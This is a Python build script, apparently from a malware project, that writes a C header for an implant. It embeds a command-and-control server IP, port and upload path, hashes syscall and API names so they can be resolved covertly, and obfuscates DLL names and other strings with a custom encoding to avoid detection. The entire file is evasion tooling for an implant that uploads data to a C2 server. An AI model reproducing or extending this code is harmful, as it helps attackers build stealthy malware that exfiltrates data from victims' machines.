import socket
import struct
import json
import re


def ReadData(FileName):
    file = open(FileName, "r")
    JsonData = json.load(file)
    file.close()

    return JsonData

def EncodeString(string):
    TempKey = 5
    EncodedString = []

    for char in string:
        char = ord(char)
        if TempKey < 0:
            TempKey = TempKey * -1
        elif TempKey == 0:
            TempKey = 5

        EncodedString.append(hex(char + TempKey))
        TempKey = char - TempKey
    
    EncodedString.append("0x00")

    return EncodedString

def HashString(string):
    total = 0
    idx = 1
    temp = 0
    CurrentValue = 0

    for i in range(len(string)):
        char = ord(string[i])
        if i + 1 == len(string):
            if idx > 20:
                idx = idx % 10
            CurrentValue = (char << idx) ^ CurrentValue
        elif i + 2 == len(string):
            CurrentValue = (ord(string[i + 1]) * idx) << 1
        else:
            CurrentValue = char * (ord(string[i + 2]) + idx)

        total += char << 2
        total += CurrentValue
        total += idx * CurrentValue
        temp += CurrentValue
        idx += 1

    return hex(total ^ temp)

def inet_addr(ip):
    return struct.unpack("I", socket.inet_aton(ip))[0]

def main():
    FullData = "#ifndef MACROS_YS\n#define MACROS_YS\n\n\n"
    ConfigData = ReadData("config.json")
    RawData = ReadData("./build-tools/RawData.json")
    OutFile = open("./include/macros.h", "w")

#add the ip and port
    FullData += f"#define C2_IP {inet_addr(ConfigData["IP"])}\n"
    FullData += f"#define C2_PORT {socket.htons(ConfigData["PORT"])}\n\n\n"

#update the path in the http request
    if ConfigData["C2_UPLOAD_PATH"] == "":
        UploadPath = "/up"
    else:
        UploadPath = ConfigData["C2_UPLOAD_PATH"]
    RawData["HttpRequestHeader"]["HTTPREQUEST"] = re.sub(r'__UPLOADPATH__', UploadPath, RawData["HttpRequestHeader"]["HTTPREQUEST"])

#hash sysaclls and functions names and other data and add them
    for item in RawData["hash"]:
        for key, value in RawData[item].items():
            HashedData = HashString(value)
            FullData += f"#define {key} {HashedData}\n"

#encode strings and add them
    for item in RawData["encode"]:
        for key, value in RawData[item].items():
            EncodedData = ", ".join(EncodeString(value))
            if item == "DLLs":
                FullData += f"#define {key} (unsigned short[{len(value) + 1}]){{{EncodedData}}}\n"
            else:
                FullData += f"#define {key} {{{EncodedData}}}\n"

    FullData += "\n\n\n#endif"
    OutFile.write(FullData)
    OutFile.close()


if __name__ == "__main__":
    main()